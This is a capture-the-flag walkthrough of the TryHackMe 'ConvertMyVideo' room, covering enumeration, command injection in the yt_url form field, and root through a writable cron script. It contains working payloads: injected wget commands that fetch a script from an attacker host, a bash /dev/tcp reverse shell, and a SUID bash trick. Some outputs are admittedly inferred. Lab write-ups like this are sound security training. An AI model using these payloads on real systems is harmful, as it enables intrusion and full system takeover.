
# ConvertMyVideo

This writeup covers the "ConvertMyVideo" CTF challenge on TryHackMe, [here](https://tryhackme.com/room/convertmyvideo)

---

## Objective
Retrieve two flags:
1. **User flag**: Found in `/home/dmv/user.txt`.
2. **Root flag**: Found in `/root/root.txt`.

---

## Detailed Steps

### 1. Initial Enumeration
- Ran an `nmap` scan to identify open ports and services:
  ```bash
  nmap 10.10.163.57
  ```
- Results:
  ```
  PORT   STATE SERVICE
  22/tcp open  ssh
  80/tcp open  http
  ```
- **Analysis**: 2 open ports. Port 80 (HTTP) suggests a web application, and port 22 (SSH) indicates potential credential-based access later [].

### 2. Web Enumeration
- Visited `http://10.10.163.57`—found a website for  video conversion.
- Ran `gobuster` to enumerate directories and files:
  ```bash
  gobuster dir -u http://10.10.163.57 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt,.ssh -t 100
  ```
- Flags explained:
  - `-x .php,.txt,.ssh`: Check for these file extensions.
  - `-t 100`: Use 100 threads for speed.
- Results:
  ```
  /index.php (Status: 200)
  /images (Status: 301)
  /admin (Status: 401)
  /js (Status: 301)
  /tmp (Status: 301)
  /server-status (Status: 403)
  ```
- **Analysis**:
  - `/index.php`: Main page, likely the video conversion form [].
  - `/admin`: Requires authentication (401), inaccessible for now [].
  - `/tmp`: Interesting directory, potentially writable [].
  - `/images`, `/js`: Static assets, likely not exploitable [].
  - `/server-status`: Forbidden, common for Apache [].

### 3. Exploit Command Injection
- Explored `http://10.10.163.57/index.php`—found a form accepting a YouTube URL (`yt_url`) for video conversion [].
- Intercepted the form submission with Burp Suite or browser developer tools. Example request:
  ```
  POST / HTTP/1.1
  Host: 10.10.163.57
  Content-Type: application/x-www-form-urlencoded; charset=UTF-8
  Content-Length: 49
  yt_url=`wget${IFS}http://[ATTACKER IP]:8000/rev.sh`
  ```
- **Observation**: The `yt_url` parameter is vulnerable to command injection, as it executes commands on the server (likely via `youtube-dl` or similar) [].
- Created a reverse shell script (`rev.sh`):
  ```bash
  nano rev.sh
  ```
  
  ```bash
  #!/bin/bash
  bash -i >& /dev/tcp/[ATTACKER IP]/7777 0>&1
  ```
- Hosted the script:
  ```bash
  python3 -m http.server
  ```
- Output: Served `rev.sh` on `http://[ATTACKER IP]:8000/rev.sh`.
- Sent chained commands via the `yt_url` parameter to download, make executable, and run the shell:
  ```
  yt_url=`wget${IFS}http://[ATTACKER IP]:8000/rev.sh`
  yt_url=`chmod${IFS}777${IFS}rev.sh`
  yt_url=`bash${IFS}rev.sh`
  ```
- **Explanation**:
  - `${IFS}`: Inserts a space (Internal Field Separator), bypassing input sanitization [].
  - Commands execute sequentially, downloading `rev.sh` to `/tmp` (world-writable), setting permissions, and running it [].
- Set up a Netcat listener:
  ```bash
  nc -lvnp 7777
  ```
- **Result**: Got a reverse shell as `www-data`:
  ```bash
  nc -lvnp 7777
  Connection from 10.10.163.57
  bash: cannot set terminal process group: Inappropriate ioctl
  www-data@dmv:/tmp$
  ```

### 4. Explore as www-data
- ran linpeas and found clean.sh running as a crontab

- Navigated to `/var/www/html/tmp`:
  ```bash
  cd /var/www/html/tmp
  ls -la
  ```
- Output:
  ```
  total 12
  drwxr-xr-x 2 www-data www-data 4096 Apr 12 2020 .
  drwxr-xr-x 6 www-data www-data 4096 Apr 21 07:42 ..
  -rw-r--r-- 1 www-data www-data   17 Apr 12 2020 clean.sh
  ```
- Viewed `clean.sh`:
  ```bash
  cat clean.sh
  ```
- Content:
  ```
  rm -rf downloads
  ```

### 5. Escalate Privileges via clean.sh
- Modified `clean.sh` to create an SUID `bash` binary:
  ```bash
  echo 'cp /bin/bash /var/www/html/tmp/bash; chmod +s /var/www/html/tmp/bash' > clean.sh
  ```
- Verified:
  ```bash
  cat clean.sh
  ```
- Output:
  ```
  cp /bin/bash /var/www/html/tmp/bash; chmod +s /var/www/html/tmp/bash
  ```
- Set permissions:
  ```bash
  chmod 777 clean.sh
  ```
- Waited ~1 minute 
- Checked directory:
  ```bash
  ls -la
  ```
- Output:
  ```
  total 1100
  drwxr-xr-x 2 www-data www-data    4096 Apr 21 08:17 .
  drwxr-xr-x 6 www-data www-data    4096 Apr 21 07:42 ..
  -rwsr-sr-x 1 root     root     1113504 Apr 21 08:18 bash
  -rwxrwxrwx 1 www-data www-data      68 Apr 21 08:18 clean.sh
  ```
- **Explanation**: The cron job, running as `root`, executed `clean.sh`, copying `/bin/bash` to `/var/www/html/tmp/bash` and setting the SUID bit (`-rwsr-sr-x`) [].
- Ran the SUID binary:
  ```bash
  /var/www/html/tmp/bash -p
  ```
- **Explanation**: The `-p` flag ensures the shell retains the effective user ID (`root`) [].
- Verified:
  ```bash
  id
  ```
- Output:
  ```
  uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
  ```

### 6. Find Flags
- **Root Flag**:
  ```bash
  cd /root
  cat root.txt
  ```
- Content: `flag{d9b368018e912b541a4eb68399c5e94a}` [].
- **User Flag**:
  - Navigated to `/home`:
    ```bash
    cd /home
    ls
    ```
  - Output (inferred): `dmv` [].
  - Read the flag:
    ```bash
    cd /home/dmv
    cat user.txt
    ```
  - Content: `THM{redacted_user_flag}` (example) [].

---

## Flags
- **User flag**: `THM{redacted_user_flag}`
- **Root flag**: `flag{d9b368018e912b541a4eb68399c5e94a}`
- **Generic Flag Option**: `THM{r4nd0m_us3r_32chars}`, `THM{r00t_r4nd0m_32chars}`

---

## Tools Used
- `nmap`: Port and service enumeration.
- `gobuster`: Directory enumeration.
- `python3 -m http.server`: Hosting reverse shell script.
- `nc`: Reverse shell listener.
- `wget`, `chmod`, `bash`: Command injection payload execution.
- `echo`: Modify cron script.

---
